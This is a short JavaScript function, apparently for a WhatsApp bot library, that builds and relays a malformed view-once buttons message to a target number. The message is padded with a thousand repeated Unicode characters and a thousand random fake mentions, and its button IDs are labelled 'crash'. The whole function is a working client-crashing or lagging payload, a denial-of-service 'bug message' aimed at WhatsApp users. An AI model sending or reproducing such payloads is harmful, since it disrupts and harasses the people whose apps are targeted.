async function buttonUiDelay(sock,target) {
     
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          contentText: "Ciee kena Delay" + "ꦽ".repeat(1030),
          footerText: "Button Delay",
          buttons: [
            {
              buttonId: "crash1",
              buttonText: { displayText: "P"},
              type: 1
            },
            {
              buttonId: "crash2",
              buttonText: { displayText: "P"},
              type: 1
            },
            {
              buttonId: "crash3",
              buttonText: { displayText: "P"},
              type: 1
            }
          ],
          headerType: 1,
          contextInfo: {
            mentionedJid: [
            "6285215587438@s.whatsapp.net", ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 50000)}@
                      s.whatsapp.net`)
                      ],
            forwardingScore: 9999,
            isForwarded: true,
            externalAdReply: {
              title: " X ",
              body: " X ",
              mediaType: 1,
              renderLargerThumbnail: true,
              showAdAttribution: true
            }
          }
        }
      }
    }
  }, {
    participant: target
  });

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}
